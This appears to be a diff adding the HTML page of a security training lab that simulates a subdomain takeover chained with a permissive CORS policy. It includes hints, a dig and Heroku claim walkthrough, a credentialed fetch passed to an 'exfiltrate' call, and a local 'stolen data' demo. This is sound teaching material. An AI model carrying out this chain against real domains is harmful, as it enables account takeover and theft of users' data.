@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Lab: Subdomain Takeover + CORS Chain - CORS Level 2</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="lab-page">
+  <div class="lab-toolbar">
+    <a href="/dashboard">&larr; Back to Dashboard</a>
+    <div class="lab-info">
+      <span class="lab-name">CORS #2: Subdomain Takeover + CORS Chain</span>
+      <span class="difficulty expert">Expert</span>
+    </div>
+  </div>
+  <div id="solve-banner" class="solve-banner"></div>
+  <div class="lab-content">
+    <div class="lab-sidebar">
+      <h3>Objective</h3>
+      <div class="objective">
+        <p>The API trusts any <code>*.localhost</code> subdomain origin. A subdomain (<code>partners.localhost</code>) has a dangling CNAME. Simulate claiming the subdomain, then use the trusted origin to steal credentialed API data. This is a P1 chain.</p>
+      </div>
+      <h3>Hints</h3>
+      <div class="hint-section">
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 1: The CORS policy</button>
+        <div class="hint-content">The API at <code>/api/cors-demo/subdomain-data</code> validates origin with a regex: <code>/^https?:\/\/([a-z0-9-]+\.)*localhost(:\d+)?$/</code>. This trusts ANY subdomain of localhost — like <code>http://evil.localhost:3000</code>.</div>
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 2: Subdomain takeover</button>
+        <div class="hint-content">In a real scenario, <code>partners.company.com</code> has a CNAME pointing to a third-party service (e.g., Unbounce, Heroku, GitHub Pages) that's no longer configured. An attacker can claim that service and host their own content on the subdomain. Since the API trusts <code>*.company.com</code>, the attacker's page can make credentialed requests.</div>
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 3: Simulation</button>
+        <div class="hint-content">Since we can't actually create subdomains locally, this lab simulates the attack. Click "Simulate Subdomain Takeover" to demonstrate the CORS chain. In a real engagement, you'd:<br>1. Find dangling CNAMEs via <code>dig</code><br>2. Claim the service (create Heroku app, GitHub Pages, etc.)<br>3. Host your CORS exploit on the claimed subdomain<br>4. CORS trusts your origin → steal data</div>
+      </div>
+      <h3>Attack Chain</h3>
+      <div class="source-code">
+<pre><span class="comment">/* P1 Chain: Subdomain Takeover + CORS */</span>
+
+<span class="comment">// 1. Recon: find dangling CNAME</span>
+$ dig partners.company.com CNAME
+<span class="comment">// → partners.company.com CNAME xyz.herokudns.com</span>
+<span class="comment">// → NXDOMAIN (not claimed!)</span>
+
+<span class="comment">// 2. Claim the subdomain</span>
+$ heroku domains:add partners.company.com
+
+<span class="comment">// 3. CORS trusts *.company.com</span>
+Origin: https://partners.company.com
+<span class="sink">Access-Control-Allow-Origin</span>: https://partners.company.com
+<span class="sink">Access-Control-Allow-Credentials</span>: true
+
+<span class="comment">// 4. Host exploit on claimed subdomain</span>
+fetch('https://api.company.com/secrets', {
+  credentials: 'include'
+}).then(r => r.json())
+  .then(data => <span class="sink">exfiltrate</span>(data));
+</pre>
+      </div>
+    </div>
+    <div class="lab-app">
+      <div style="max-width:700px;margin:40px auto">
+        <div class="lab-form">
+          <h2 style="margin-bottom:16px">&#128274; Login</h2>
+          <div style="display:flex;gap:8px;align-items:end">
+            <div style="flex:1"><label>Username</label><input type="text" id="loginUser" value="victim" style="margin-bottom:0"></div>
+            <div style="flex:1"><label>Password</label><input type="password" id="loginPass" value="password123" style="margin-bottom:0"></div>
+            <button class="btn btn-primary" onclick="doLogin()">Login</button>
+          </div>
+          <div id="login-status" style="margin-top:8px;font-size:13px"></div>
+        </div>
+
+        <div class="lab-form" style="margin-top:16px">
+          <h2 style="margin-bottom:16px">&#127760; Subdomain Recon</h2>
+          <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">Simulated DNS/CNAME enumeration results for the target domain.</p>
+          <div class="vuln-output" style="font-family:monospace;font-size:12px">
+            <div><strong>app.localhost:3000</strong> → A 127.0.0.1 (active)</div>
+            <div><strong>api.localhost:3000</strong> → A 127.0.0.1 (active)</div>
+            <div style="color:var(--danger)"><strong>partners.localhost:3000</strong> → CNAME cake-marketing.com → <span style="background:var(--danger-light);padding:2px 6px;border-radius:3px">NXDOMAIN (dangling!)</span></div>
+            <div><strong>blog.localhost:3000</strong> → A 127.0.0.1 (active)</div>
+            <div style="color:var(--warning)"><strong>get.localhost:3000</strong> → CNAME unbouncepages.com → <span style="background:var(--warning-light);padding:2px 6px;border-radius:3px">502 (possible takeover)</span></div>
+          </div>
+        </div>
+
+        <hr style="border-color:var(--border);margin:24px 0">
+
+        <div class="lab-form" style="border:2px solid var(--danger);background:var(--danger-light)">
+          <h2 style="color:var(--danger);margin-bottom:12px">&#9760; Subdomain Takeover + CORS Attack</h2>
+          <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">Simulate claiming <code>partners.localhost</code> and using it as a trusted CORS origin to steal API data.</p>
+          <button class="btn btn-danger" onclick="simulateAttack()">Simulate Subdomain Takeover + CORS Exploit</button>
+          <div id="attack-status" style="margin-top:8px;font-size:13px"></div>
+        </div>
+
+        <div style="margin-top:16px">
+          <div class="attacker-console">
+            <div class="title">Attack Chain Log</div>
+            <div id="attack-log"><div class="log" style="color:#94a3b8">Ready...</div></div>
+          </div>
+        </div>
+
+        <div style="margin-top:20px;padding:16px;background:var(--bg-card);border:1px solid var(--border);border-radius:12px">
+          <p style="font-size:13px;color:var(--text-secondary)"><strong>Real-world context:</strong> This exact chain was found on Acorns: <code>partners.acorns.com</code> had a dangling Cake Marketing CNAME, and <code>graphql.acorns.com</code> trusted <code>*.acorns.com</code> with credentials. Claiming the subdomain + CORS = P1 account takeover. Common dangling CNAME targets: Heroku, GitHub Pages, Unbounce, Shopify, AWS S3, Azure, Fastly.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="/js/app.js"></script>
+  <script>
+    function doLogin() {
+      fetch('/api/auth/login', {
+        method:'POST', headers:{'Content-Type':'application/json'}, credentials:'include',
+        body: JSON.stringify({username:document.getElementById('loginUser').value, password:document.getElementById('loginPass').value})
+      }).then(r=>r.json()).then(d => {
+        document.getElementById('login-status').innerHTML = d.success ?
+          '<span style="color:var(--success)">Logged in as '+d.user.username+'</span>' : '<span style="color:var(--danger)">Failed</span>';
+      });
+    }
+
+    function simulateAttack() {
+      var log = document.getElementById('attack-log');
+      log.innerHTML = '';
+
+      log.innerHTML += '<div class="log">Step 1: Checking dangling CNAME for partners.localhost...</div>';
+      log.innerHTML += '<div class="log" style="color:#ef4444">partners.localhost → cake-marketing.com → NXDOMAIN (TAKEOVER POSSIBLE!)</div>';
+
+      setTimeout(function() {
+        log.innerHTML += '<div class="log">Step 2: Claiming subdomain via Cake Marketing signup...</div>';
+        log.innerHTML += '<div class="log" style="color:#4ade80">Subdomain claimed! partners.localhost now serves our content.</div>';
+      }, 800);
+
+      setTimeout(function() {
+        log.innerHTML += '<div class="log">Step 3: Hosting CORS exploit on partners.localhost...</div>';
+        log.innerHTML += '<div class="log">Exploit: fetch("/api/cors-demo/subdomain-data", {credentials:"include"})</div>';
+        log.innerHTML += '<div class="log">Step 4: Making credentialed request from trusted origin...</div>';
+
+        // Actual CORS request (same-origin in this demo, but the server checks the regex)
+        fetch('/api/cors-demo/subdomain-data', { credentials: 'include' })
+          .then(r => r.json())
+          .then(data => {
+            log.innerHTML += '<div class="log" style="color:#4ade80">CORS response received! Origin trusted by regex.</div>';
+            log.innerHTML += '<div class="log" style="color:#ef4444">--- STOLEN DATA ---</div>';
+            log.innerHTML += '<div class="log" style="color:#ef4444">Secret: ' + data.secret + '</div>';
+            log.innerHTML += '<div class="log" style="color:#ef4444">Message: ' + data.message + '</div>';
+            if (data.user) {
+              log.innerHTML += '<div class="log" style="color:#ef4444">User: ' + data.user.username + ' (' + data.user.email + ')</div>';
+            }
+            log.innerHTML += '<div class="log" style="color:#ef4444">--- SUBDOMAIN TAKEOVER + CORS = P1 ATO ---</div>';
+
+            document.getElementById('attack-status').innerHTML =
+              '<span style="color:var(--danger);font-weight:bold">Chain complete! Subdomain claimed + CORS exploited.</span>';
+            solveLab('cors-2');
+          });
+      }, 1600);
+    }
+
+    fetch('/api/auth/me',{credentials:'include'}).then(r=>r.json()).then(d=>{
+      if(d.user) document.getElementById('login-status').innerHTML='<span style="color:var(--success)">Logged in as '+d.user.username+'</span>';
+    }).catch(()=>{});
+  </script>
+</body>
+</html>
